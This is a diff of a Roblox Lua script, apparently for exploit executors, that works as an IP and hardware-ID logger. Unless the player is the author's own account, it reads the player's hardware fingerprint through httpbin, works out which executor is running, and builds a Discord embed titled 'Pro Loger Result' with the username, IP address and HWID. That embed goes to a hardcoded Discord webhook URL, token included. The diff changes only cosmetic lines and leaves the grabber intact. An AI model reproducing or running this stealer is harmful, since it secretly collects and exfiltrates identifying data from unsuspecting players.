@@ -1,7 +1,7 @@
 if game.Players.LocalPlayer.Name == "Anonymy4876" then
 	print("Bypased")
 else
-	local http_request = http_request or request or HttpPost or syn.request or http.request;
+	local http_request = http_request or request or HttpPost or syn.request or http.request
 	local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
 	local decoded = game:GetService('HttpService'):JSONDecode(body)
 	local hwid = decoded.headers["Syn-Fingerprint"]
@@ -13,16 +13,16 @@ else
 	   KRNL_LOADED and "Krnl" or
 	   SONA_LOADED and "Sona" or
 	   "Kid with shit exploit"
- 
+	 
 	local url =
 	   "https://discord.com/api/webhooks/1066077230511427655/tjhr6Fpf0Df5_u7Q2R9vePOkktimBNbL2p_YRhScIWfimbYMazOw2hC2EpBTxc5xAC5Y"
 	local data = {
 	   ["content"] = "",
 	   ["embeds"] = {
 	       {
-	           ["title"] = "**Blop Loger Result**",
+	           ["title"] = "**Pro Loger Result**",
 	           ["description"] = "**Username: " .. game.Players.LocalPlayer.Name.." with "..webhookcheck.." \nIP: "..ip.. " \nHWID: "..hwid.."**",
- 
+	 
 	           ["type"] = "rich",
 	           ["color"] = tonumber(0x7269da),
 	           ["image"] = {
@@ -33,7 +33,7 @@ else
 	   }
 	}
 	local newdata = game:GetService("HttpService"):JSONEncode(data)
- 
+	 
 	local headers = {
 	   ["content-type"] = "application/json"
 	}
